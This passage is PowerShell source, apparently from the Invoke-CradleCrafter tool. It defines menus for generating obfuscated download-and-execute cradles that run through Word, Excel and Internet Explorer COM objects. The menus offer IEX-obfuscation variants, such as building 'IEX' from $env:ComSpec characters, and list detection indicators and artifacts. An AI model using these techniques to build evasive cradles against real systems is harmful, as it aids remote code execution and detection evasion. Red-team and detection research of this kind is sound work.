    
    $MenuLevel_Memory_PsComWord_Boolean2          =   @()
    $MenuLevel_Memory_PsComWord_Boolean2         += , @($LineSpacing, '1' , "Default         --> <`$True>"                                 , @('Out-Cradle', $CradleType, 'BooleanTrue', 1))
    $MenuLevel_Memory_PsComWord_Boolean2         += , @($LineSpacing, '2' , "Integer         --> <1>"                                      , @('Out-Cradle', $CradleType, 'BooleanTrue', 2))
    $MenuLevel_Memory_PsComWord_Boolean2         += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV T*ue>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanTrue', 3))
    
    $MenuLevel_Memory_PsComWord_Invoke            =   @()
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '1'  , "   No Invoke         --> For <testing> download sans IEX"    , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '2'  , "   PS IEX            --> <IEX/Invoke-Expression>"            , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '3'  , "   PS Get-Alias      --> <Get-Alias>/<GAL>"                  , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '4'  , "   PS Get-Command    --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '5'  , "   PS1.0 GetCmdlet   --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '6'  , "   PS1.0 Invoke      --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '7'  , "   ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"     , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '8'  , "   PS Runspace       --> <[PowerShell]::Create()> (StdOut)"  , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '9'  , "   Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>" , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsComWord_Invoke           += , @($LineSpacing, '10' , "   Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"       , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsComWord_All               =   @()
    $MenuLevel_Memory_PsComWord_All              += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsComExcel                =   @()
    $MenuContext_Memory_PsComExcel               += , @('Name         ','PsComExcel')
    $MenuContext_Memory_PsComExcel               += , @('Description  ','PowerShell leveraging Microsoft Excel via COM Object interactions')
    $MenuContext_Memory_PsComExcel               += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsComExcel               += , @('Dependencies ','Excel.exe')
    $MenuContext_Memory_PsComExcel               += , @('Footprint    ','.URL file and cached file(s) on disk')
    $MenuContext_Memory_PsComExcel               += , @('Indicators   ',@('svchost.exe spawns excel.exe','excel.exe makes network connection instead of powershell.exe','A/V can flag on cached file(s) on disk'))
    $MenuContext_Memory_PsComExcel               += , @('Artifacts    ',@('C:\Windows\Prefetch\EXCEL.EXE-********.pf','\AppData\Roaming\Microsoft\Windows\Recent\*.URL file','\AppData\*\(Temporary Internet Files|INetCache)\*.txt'))
    $MenuContext_Memory_PsComExcel               += , @('User-Agent   ',@('Microsoft Office Word *','Microsoft Office Existence Discovery','Mozilla/* (compatible; MSIE *; Windows NT *; Win64; x64; Trident/*; .NET* .NET CLR *; ms-office; MSOffice *'))
    
    $CradleType = 12

    $MenuLevel_Memory_PsComExcel                  =   @()
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Cmdlet2  ' , '<Start-Sleep>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Method   ' , '<Open>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Method2  ' , '<Item>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Flag     ' , '<-C[omObject]> (flag substring)')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property ' , '<DisplayAlerts>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property2' , '<Busy>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property3' , '<Workbooks>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property4' , '<Range>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property5' , '<UsedRange>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property6' , '<Rows>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property7' , '<Count>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Property8' , '<Value2>/<Formula>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Class    ' , '<[Runtime.InteropServices.Marshal]>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Boolean  ' , '<$False>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Join     ' , '$Array<-Join"`n">')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Newline  ' , '<"`n">/<[Char]10>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsComExcel                 += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')
    
    $MenuLevel_Memory_PsComExcel_Rearrange        =   @()
    $MenuLevel_Memory_PsComExcel_Rearrange       += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsComExcel_Rearrange       += , @($LineSpacing, '2' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    
    $MenuLevel_Memory_PsComExcel_Cmdlet           =   @()
    $MenuLevel_Memory_PsComExcel_Cmdlet          += , @($LineSpacing, '1' , "PS New-Object    --> <New-Object>"                            , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsComExcel_Cmdlet          += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsComExcel_Cmdlet          += , @($LineSpacing, '3' , "PS1.0 GetCmdlets --> <`$ExecutionContext...>"                 , @('Out-Cradle', $CradleType, 'NewObject', 3))

    $MenuLevel_Memory_PsComExcel_Cmdlet2          =   @()
    $MenuLevel_Memory_PsComExcel_Cmdlet2         += , @($LineSpacing, '1' , "PS Start-Sleep   --> <Start-Sleep -Seconds 1>"                , @('Out-Cradle', $CradleType, 'Sleep', 1))
    $MenuLevel_Memory_PsComExcel_Cmdlet2         += , @($LineSpacing, '2' , "PS Sleep         --> <Sleep -Se 1>"                           , @('Out-Cradle', $CradleType, 'Sleep', 2))
    $MenuLevel_Memory_PsComExcel_Cmdlet2         += , @($LineSpacing, '3' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'Sleep', 3))
    $MenuLevel_Memory_PsComExcel_Cmdlet2         += , @($LineSpacing, '4' , "PS1.0 GetCmdlets --> <`$ExecutionContext>..."                 , @('Out-Cradle', $CradleType, 'Sleep', 4))
    
    $MenuLevel_Memory_PsComExcel_Method           =   @()
    $MenuLevel_Memory_PsComExcel_Method          += , @($LineSpacing, '1' , "Open         --> <Open>"                                      , @('Out-Cradle', $CradleType, 'Open', 1))
    $MenuLevel_Memory_PsComExcel_Method          += , @($LineSpacing, '2' , "PS PsObject  --> <.PsObject.Properties>"                      , @('Out-Cradle', $CradleType, 'Open', 2))
    
    $MenuLevel_Memory_PsComExcel_Method2          =   @()
    $MenuLevel_Memory_PsComExcel_Method2         += , @($LineSpacing, '1' , "Item         --> <Item>"                                      , @('Out-Cradle', $CradleType, 'Item', 1))
    $MenuLevel_Memory_PsComExcel_Method2         += , @($LineSpacing, '2' , "PS PsObject  --> <.PsObject.Properties>"                      , @('Out-Cradle', $CradleType, 'Item', 2))
    
    $MenuLevel_Memory_PsComExcel_Flag             =   @()
    $MenuLevel_Memory_PsComExcel_Flag            += , @($LineSpacing, '1' , "Full Flag        --> <-ComObject>"                            , @('Out-Cradle', $CradleType, 'ComObjectFlag', 1))
    $MenuLevel_Memory_PsComExcel_Flag            += , @($LineSpacing, '2' , "Flag Substring   --> <-C[omObject]>"                          , @('Out-Cradle', $CradleType, 'ComObjectFlag', 2))
    
    $MenuLevel_Memory_PsComExcel_Property         =   @()
    $MenuLevel_Memory_PsComExcel_Property        += , @($LineSpacing, '1' , "DisplayAlerts  --> <DisplayAlerts>"                           , @('Out-Cradle', $CradleType, 'DisplayAlerts', 1))
    $MenuLevel_Memory_PsComExcel_Property        += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'DisplayAlerts', 2))
    
    $MenuLevel_Memory_PsComExcel_Property2        =   @()
    $MenuLevel_Memory_PsComExcel_Property2       += , @($LineSpacing, '1' , "Busy           --> <Busy>"                                    , @('Out-Cradle', $CradleType, 'Busy', 1))
    $MenuLevel_Memory_PsComExcel_Property2       += , @($LineSpacing, '2' , "PS PsObject    --> <.PsObject.Properties>"                    , @('Out-Cradle', $CradleType, 'Busy', 2))
    $MenuLevel_Memory_PsComExcel_Property2       += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Busy', 3))
    
    $MenuLevel_Memory_PsComExcel_Property3        =   @()
    $MenuLevel_Memory_PsComExcel_Property3       += , @($LineSpacing, '1' , "Workbooks      --> <Workbooks>"                               , @('Out-Cradle', $CradleType, 'Workbooks', 1))
    $MenuLevel_Memory_PsComExcel_Property3       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Workbooks', 2))

    $MenuLevel_Memory_PsComExcel_Property4        =   @()
    $MenuLevel_Memory_PsComExcel_Property4       += , @($LineSpacing, '1' , "Range        --> <Range>"                                     , @('Out-Cradle', $CradleType, 'Range', 1))
    $MenuLevel_Memory_PsComExcel_Property4       += , @($LineSpacing, '2' , "PS PsObject  --> <| Get-Member>"                              , @('Out-Cradle', $CradleType, 'Range', 2))
    
    $MenuLevel_Memory_PsComExcel_Property5        =   @()
    $MenuLevel_Memory_PsComExcel_Property5       += , @($LineSpacing, '1' , "UsedRange      --> <UsedRange>"                               , @('Out-Cradle', $CradleType, 'UsedRange', 1))
    $MenuLevel_Memory_PsComExcel_Property5       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'UsedRange', 2))
    
    $MenuLevel_Memory_PsComExcel_Property6        =   @()
    $MenuLevel_Memory_PsComExcel_Property6       += , @($LineSpacing, '1' , "Rows           --> <Rows>"                                    , @('Out-Cradle', $CradleType, 'Rows', 1))
    $MenuLevel_Memory_PsComExcel_Property6       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Rows', 2))
    
    $MenuLevel_Memory_PsComExcel_Property7        =   @()
    $MenuLevel_Memory_PsComExcel_Property7       += , @($LineSpacing, '1' , "Count          --> <Count>"                                   , @('Out-Cradle', $CradleType, 'Count', 1))
    $MenuLevel_Memory_PsComExcel_Property7       += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Count', 2))
    
    $MenuLevel_Memory_PsComExcel_Property8        =   @()
    $MenuLevel_Memory_PsComExcel_Property8       += , @($LineSpacing, '1' , "Value2         --> <Value2>"                                  , @('Out-Cradle', $CradleType, 'ValueOrFormula', 1))
    $MenuLevel_Memory_PsComExcel_Property8       += , @($LineSpacing, '2' , "Formula        --> <Formula>/<FormulaLocal>"                  , @('Out-Cradle', $CradleType, 'ValueOrFormula', 2))
    $MenuLevel_Memory_PsComExcel_Property8       += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'ValueOrFormula', 3))
    
    $MenuLevel_Memory_PsComExcel_Class            =   @()
    $MenuLevel_Memory_PsComExcel_Class           += , @($LineSpacing, '1' , "Default   --> <[Void][System.Runtime>..."                     , @('Out-Cradle', $CradleType, 'RuntimeInteropServicesMarshal', 1))
    $MenuLevel_Memory_PsComExcel_Class           += , @($LineSpacing, '2' , "Random    --> (<[Void]/`$Null=>)<[Runtime>..."                , @('Out-Cradle', $CradleType, 'RuntimeInteropServicesMarshal', 2))
    
    $MenuLevel_Memory_PsComExcel_Boolean          =   @()
    $MenuLevel_Memory_PsComExcel_Boolean         += , @($LineSpacing, '1' , "Default         --> <`$False>"                                , @('Out-Cradle', $CradleType, 'BooleanFalse', 1))
    $MenuLevel_Memory_PsComExcel_Boolean         += , @($LineSpacing, '2' , "Integer         --> <0>"                                      , @('Out-Cradle', $CradleType, 'BooleanFalse', 2))
    $MenuLevel_Memory_PsComExcel_Boolean         += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV F*se>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanFalse', 3))
    
    $MenuLevel_Memory_PsComExcel_Boolean2         =   @()
    $MenuLevel_Memory_PsComExcel_Boolean2        += , @($LineSpacing, '1' , "Default         --> <`$True>"                                 , @('Out-Cradle', $CradleType, 'BooleanTrue', 1))
    $MenuLevel_Memory_PsComExcel_Boolean2        += , @($LineSpacing, '2' , "Integer         --> <1>"                                      , @('Out-Cradle', $CradleType, 'BooleanTrue', 2))
    $MenuLevel_Memory_PsComExcel_Boolean2        += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV T*ue>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanTrue', 3))
    
    $MenuLevel_Memory_PsComExcel_Join             =   @()
    $MenuLevel_Memory_PsComExcel_Join            += , @($LineSpacing, '1' , "PS Join    --> `$Array<-Join`"``n`">"                         , @('Out-Cradle', $CradleType, 'JoinNewline', 1))
    $MenuLevel_Memory_PsComExcel_Join            += , @($LineSpacing, '2' , ".Net Join  --> <[String]::Join(`"``n`",>`$Array<)>"           , @('Out-Cradle', $CradleType, 'JoinNewline', 2))

    $MenuLevel_Memory_PsComExcel_Newline          =   @()
    $MenuLevel_Memory_PsComExcel_Newline         += , @($LineSpacing, '1' , "Escaped    --> <`"``n`">"                                     , @('Out-Cradle', $CradleType, 'Newline', 1))
    $MenuLevel_Memory_PsComExcel_Newline         += , @($LineSpacing, '2' , "Type Cast  --> <[Char]10>"                                    , @('Out-Cradle', $CradleType, 'Newline', 2))
    $MenuLevel_Memory_PsComExcel_Newline         += , @($LineSpacing, '3' , "As Char    --> <10-as'Char'>"                                 , @('Out-Cradle', $CradleType, 'Newline', 3))
    
    $MenuLevel_Memory_PsComExcel_Invoke           =   @()
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '1'  , "   No Invoke         --> For <testing> download sans IEX"    , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '2'  , "   PS IEX            --> <IEX/Invoke-Expression>"            , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '3'  , "   PS Get-Alias      --> <Get-Alias>/<GAL>"                  , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '4'  , "   PS Get-Command    --> <Get-Command>/<GCM>"                , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '5'  , "   PS1.0 GetCmdlet   --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '6'  , "   PS1.0 Invoke      --> <`$ExecutionContext>..."            , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '7'  , "   ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"     , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '8'  , "   PS Runspace       --> <[PowerShell]::Create()> (StdOut)"  , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '9'  , "   Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>" , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsComExcel_Invoke          += , @($LineSpacing, '10' , "   Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"       , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsComExcel_All              =   @()
    $MenuLevel_Memory_PsComExcel_All             += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsComIE                   =   @()
    $MenuContext_Memory_PsComIE                  += , @('Name         ','PsComIE')
    $MenuContext_Memory_PsComIE                  += , @('Description  ','PowerShell leveraging Microsoft Internet Explorer via COM Object interactions')
    $MenuContext_Memory_PsComIE                  += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_PsComIE                  += , @('Dependencies ','Iexplore.exe')
    $MenuContext_Memory_PsComIE                  += , @('Footprint    ','.URL file and cached file(s) on disk.')
    $MenuContext_Memory_PsComIE                  += , @('Indicators   ',@('powershell.exe loads ieproxy.dll','svchost.exe spawns iexplore.exe','iexplore.exe makes network connection instead of powershell.exe','A/V can flag on cached file(s) on disk'))
    $MenuContext_Memory_PsComIE                  += , @('Artifacts    ',@('C:\Windows\Prefetch\IEXPLORE.EXE-********.pf','\AppData\Roaming\Microsoft\Windows\Recent\*.URL file','\AppData\*\(Temporary Internet Files|INetCache)\*.txt'))
    $MenuContext_Memory_PsComIE                  += , @('User-Agent   ','Mozilla/* (Windows NT *; *; Trident/*; rv:*) like Gecko    (tested on IE11)')
    $MenuContext_Memory_PsComIE                  += , @('Note         ','The file extension of input URL may affect rendering in IE (depending on version) that can lead to errors. E.g. a payload of extension .html will not render newlines properly with Invoke-CradleCrafter''s InnerText and OuterText methods, but if you manually change to InnerHtml then it will work fine.')

    $CradleType = 13

    $MenuLevel_Memory_PsComIE                     =   @()
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Cmdlet   ' , '<New-Object>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Cmdlet2  ' , '<Start-Sleep>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Flag     ' , '<-C[omObject]> (flag substring)')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Method   ' , '<Navigate>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Property ' , '<Visible>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Property2' , '<Silent>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Property3' , '<Busy>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Property4' , '<Document>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Property5' , '<Body>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Property6' , '<InnerText>/<OuterText>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Class    ' , '<[Runtime.InteropServices.Marshal]>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Boolean  ' , '<$False>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Boolean2 ' , '<$True>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsComIE                    += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')
    
    $MenuLevel_Memory_PsComIE_Rearrange           =   @()
    $MenuLevel_Memory_PsComIE_Rearrange          += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsComIE_Rearrange          += , @($LineSpacing, '2' , "Default2         --> <Hash Table> syntax arrangement"         , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsComIE_Rearrange          += , @($LineSpacing, '3' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    $MenuLevel_Memory_PsComIE_Rearrange          += , @($LineSpacing, '4' , "Random-Variable2 --> <Random> variable names and syntax 2"    , @('Out-Cradle', $CradleType, 'Rearrange', 4))
    
    $MenuLevel_Memory_PsComIE_Cmdlet              =   @()
    $MenuLevel_Memory_PsComIE_Cmdlet             += , @($LineSpacing, '1' , "PS New-Object    --> <New-Object>"                            , @('Out-Cradle', $CradleType, 'NewObject', 1))
    $MenuLevel_Memory_PsComIE_Cmdlet             += , @($LineSpacing, '2' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'NewObject', 2))
    $MenuLevel_Memory_PsComIE_Cmdlet             += , @($LineSpacing, '3' , "PS1.0 GetCmdlets --> <`$ExecutionContext...>"                 , @('Out-Cradle', $CradleType, 'NewObject', 3))

    $MenuLevel_Memory_PsComIE_Cmdlet2             =   @()
    $MenuLevel_Memory_PsComIE_Cmdlet2            += , @($LineSpacing, '1' , "PS Start-Sleep   --> <Start-Sleep -Seconds 1>"                , @('Out-Cradle', $CradleType, 'Sleep', 1))
    $MenuLevel_Memory_PsComIE_Cmdlet2            += , @($LineSpacing, '2' , "PS Sleep         --> <Sleep -Se 1>"                           , @('Out-Cradle', $CradleType, 'Sleep', 2))
    $MenuLevel_Memory_PsComIE_Cmdlet2            += , @($LineSpacing, '3' , "PS Get-Command   --> <Get-Command>/<GCM>"                     , @('Out-Cradle', $CradleType, 'Sleep', 3))
    $MenuLevel_Memory_PsComIE_Cmdlet2            += , @($LineSpacing, '4' , "PS1.0 GetCmdlets --> <`$ExecutionContext>..."                 , @('Out-Cradle', $CradleType, 'Sleep', 4))

    $MenuLevel_Memory_PsComIE_Flag                =   @()
    $MenuLevel_Memory_PsComIE_Flag               += , @($LineSpacing, '1' , "Full Flag        --> <-ComObject>"                            , @('Out-Cradle', $CradleType, 'ComObjectFlag', 1))
    $MenuLevel_Memory_PsComIE_Flag               += , @($LineSpacing, '2' , "Flag Substring   --> <-C[omObject]>"                          , @('Out-Cradle', $CradleType, 'ComObjectFlag', 2))
    
    $MenuLevel_Memory_PsComIE_Method              =   @()
    $MenuLevel_Memory_PsComIE_Method             += , @($LineSpacing, '1' , "PS Navigate   --> <Navigate>"                                 , @('Out-Cradle', $CradleType, 'Navigate', 1))
    $MenuLevel_Memory_PsComIE_Method             += , @($LineSpacing, '2' , "PS Navigate2  --> <Navigate2>"                                , @('Out-Cradle', $CradleType, 'Navigate', 2))
    $MenuLevel_Memory_PsComIE_Method             += , @($LineSpacing, '3' , "PS Get-Member --> <| Get-Member>"                             , @('Out-Cradle', $CradleType, 'Navigate', 3))

    $MenuLevel_Memory_PsComIE_Property            =   @()
    $MenuLevel_Memory_PsComIE_Property           += , @($LineSpacing, '1' , "Visible        --> <Visible>"                                 , @('Out-Cradle', $CradleType, 'Visible', 1))
    $MenuLevel_Memory_PsComIE_Property           += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Visible', 2))
    
    $MenuLevel_Memory_PsComIE_Property2           =   @()
    $MenuLevel_Memory_PsComIE_Property2          += , @($LineSpacing, '1' , "Silent         --> <Silent>"                                  , @('Out-Cradle', $CradleType, 'Silent', 1))
    $MenuLevel_Memory_PsComIE_Property2          += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Silent', 2))
    
    $MenuLevel_Memory_PsComIE_Property3           =   @()
    $MenuLevel_Memory_PsComIE_Property3          += , @($LineSpacing, '1' , "Busy           --> <Busy>"                                    , @('Out-Cradle', $CradleType, 'Busy', 1))
    $MenuLevel_Memory_PsComIE_Property3          += , @($LineSpacing, '2' , "PS PsObject    --> <.PsObject.Properties>"                    , @('Out-Cradle', $CradleType, 'Busy', 2))
    $MenuLevel_Memory_PsComIE_Property3          += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Busy', 3))
    
    $MenuLevel_Memory_PsComIE_Property4           =   @()
    $MenuLevel_Memory_PsComIE_Property4          += , @($LineSpacing, '1' , "Document       --> <Document>"                                , @('Out-Cradle', $CradleType, 'Document', 1))
    $MenuLevel_Memory_PsComIE_Property4          += , @($LineSpacing, '2' , "PS PsObject    --> <.PsObject.Properties>"                    , @('Out-Cradle', $CradleType, 'Document', 2))
    $MenuLevel_Memory_PsComIE_Property4          += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Document', 2))

    $MenuLevel_Memory_PsComIE_Property5           =   @()
    $MenuLevel_Memory_PsComIE_Property5          += , @($LineSpacing, '1' , "Body           --> <Body>"                                    , @('Out-Cradle', $CradleType, 'Body', 1))
    $MenuLevel_Memory_PsComIE_Property5          += , @($LineSpacing, '2' , "PS PsObject    --> <.PsObject.Properties>"                    , @('Out-Cradle', $CradleType, 'Body', 2))
    $MenuLevel_Memory_PsComIE_Property5          += , @($LineSpacing, '3' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Body', 3))
    
    $MenuLevel_Memory_PsComIE_Property6           =   @()
    $MenuLevel_Memory_PsComIE_Property6          += , @($LineSpacing, '1' , "InnerText      --> <InnerText>/<OuterText>"                   , @('Out-Cradle', $CradleType, 'InnerText', 1))
    $MenuLevel_Memory_PsComIE_Property6          += , @($LineSpacing, '2' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'InnerText', 2))
    
    $MenuLevel_Memory_PsComIE_Class               =   @()
    $MenuLevel_Memory_PsComIE_Class              += , @($LineSpacing, '1' , "Default   --> <[Void][System.Runtime>..."                     , @('Out-Cradle', $CradleType, 'RuntimeInteropServicesMarshal', 1))
    $MenuLevel_Memory_PsComIE_Class              += , @($LineSpacing, '2' , "Random    --> (<[Void]/`$Null=>)<[Runtime>..."                , @('Out-Cradle', $CradleType, 'RuntimeInteropServicesMarshal', 2))
    
    $MenuLevel_Memory_PsComIE_Boolean             =   @()
    $MenuLevel_Memory_PsComIE_Boolean            += , @($LineSpacing, '1' , "Default         --> <`$False>"                                , @('Out-Cradle', $CradleType, 'BooleanFalse', 1))
    $MenuLevel_Memory_PsComIE_Boolean            += , @($LineSpacing, '2' , "Integer         --> <0>"                                      , @('Out-Cradle', $CradleType, 'BooleanFalse', 2))
    $MenuLevel_Memory_PsComIE_Boolean            += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV F*se>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanFalse', 3))
    
    $MenuLevel_Memory_PsComIE_Boolean2            =   @()
    $MenuLevel_Memory_PsComIE_Boolean2           += , @($LineSpacing, '1' , "Default         --> <`$True>"                                 , @('Out-Cradle', $CradleType, 'BooleanTrue', 1))
    $MenuLevel_Memory_PsComIE_Boolean2           += , @($LineSpacing, '2' , "Integer         --> <1>"                                      , @('Out-Cradle', $CradleType, 'BooleanTrue', 2))
    $MenuLevel_Memory_PsComIE_Boolean2           += , @($LineSpacing, '3' , "PS Get-Variable --> (<GV T*ue>).Value"                        , @('Out-Cradle', $CradleType, 'BooleanTrue', 3))
    
    $MenuLevel_Memory_PsComIE_Invoke              =   @()
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '1'  , "  No Invoke         --> For <testing> download sans IEX"     , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '2'  , "  PS IEX            --> <IEX/Invoke-Expression>"             , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '3'  , "  PS Get-Alias      --> <Get-Alias>/<GAL>"                   , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '4'  , "  PS Get-Command    --> <Get-Command>/<GCM>"                 , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsComIE_Invoke             += , @($LineSpacing, '5'  , "  PS1.0 GetCmdlet   --> <`$ExecutionContext>..."             , @('Out-Cradle', $CradleType, 'Invoke', 5))
